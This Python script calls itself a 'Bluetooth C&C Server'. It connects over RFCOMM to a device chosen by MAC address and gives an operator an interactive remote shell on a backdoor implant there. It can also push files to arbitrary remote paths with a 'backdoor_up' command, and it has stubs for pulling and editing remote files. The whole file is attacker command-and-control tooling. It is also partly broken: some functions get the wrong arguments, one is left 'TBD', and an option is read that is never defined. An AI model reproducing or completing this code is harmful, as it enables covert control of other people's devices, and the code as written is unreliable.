from bluetooth import *
import os
import time
import argparse
import struct

p32 = lambda x : struct.pack("<i", x)
up32 = lambda x : struct.unpack("<i", x)

'''
mac_addr = input('MAC ADDR : ')
sock = BluetoothSocket(RFCOMM)
sock.connect((mac_addr, 1))
'''

def chk_remote_path(socket,path):
    sock.send(p32(len(f'ls {path}')))
    sock.send(f"ls {path}".encode())
    time.sleep(1)
    data = sock.recv(1024)

    if b"No such file or directory" in data:
        sock.send(b'\x00')
        return False
    else:
        sock.send(b'\x01')
        return True

def chk_local_path(path):
    return os.path.isfile(path)

def send_file(socket,path,dst=None):
    if chk_local_path(path)==False:
        return -1
    if dst==None:
        dst = input("Destination Path : ")
        
    dst_dir_path, _ = os.path.split(dst)

    ### Send file ###
    socket.send(f"backdoor_up {dst}".encode())

    if chk_remote_path(socket,dst_dir_path)==False:
        print("[-] Send File Fail")
        return -2

    with open(path, 'rb') as f:
        while True:
            data = f.read(10)

            if len(data) == 0:
                socket.send(p32(len(data)))
                break

            print(len(data))
            print(data)
            socket.send(p32(len(data)))
            socket.send(data)

    
def recv_file(socket,path,dst=None):
    if chk_remote_path(socket, path)==False:
        return -2
    if dst == None:
        dst = input("Destination Path : ")
    if chk_local_path(dst)==False:
        #make directory
        print("TBD")
    
    ### Recv file ###


def edit_file(socket,path):
    recv_file(socket, path,".")
    ### Edit file###

    send_file(socket,"."+"/"+path.split("/")[-1])
    os.remove("."+"/"+path.split("/")[-1])



def shell(socket):
    while(1):
        print("Default mode is interactive command line")
        mode = input("Command : ")
        if (mode == "sendfile") or (mode == "s") :
            path = input("local file path to send : ")
            send_file(path)
            print("Sending File : {}")

        elif (mode == "recvfile") or (mode == "r"):
            path = input("Remote file path to download : ")
            recv_file(path)
            print("Receiving File : {}")

        elif (mode == "editfile") or (mode == "e"):
            path = input("Remote file path to edit : ")
            edit_file(path)
            print("Editing File : {}")

        else:
            try:
                sock.send(mode)
                time.sleep(1)
                data = sock.recv(1024)
                print(data.decode('euc-kr'))
                    
            except KeyboardInterrupt:
                print('Finished')
                break

    sock.close()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bluetooth C&C Server')
    parser.add_argument("-m", "--macaddr",type=str, dest="mac",action="store",required=True)
    parser.add_argument("-s", "--sendfile",type=str, dest="sendfile",action="store")
    parser.add_argument("-r", "--recvfile",type=str, dest="recvfile",action="store")
    parser.add_argument("-e", "--editfile",type=str, dest="sendfile",action="store")
    
    args= parser.parse_args()
    print(args)

    #connection
    mac_addr = args.mac
    sock = BluetoothSocket(RFCOMM)
    sock.connect((mac_addr, 1))

    if args.sendfile != None:
        send_file(sock,args.sendfile)
        exit()
    if args.recvfile != None:
        recv_file(sock,args.recvfile)
        exit()
    if args.editfile != None:
        edit_file(sock,args.editfile)
        exit()

    shell(sock)
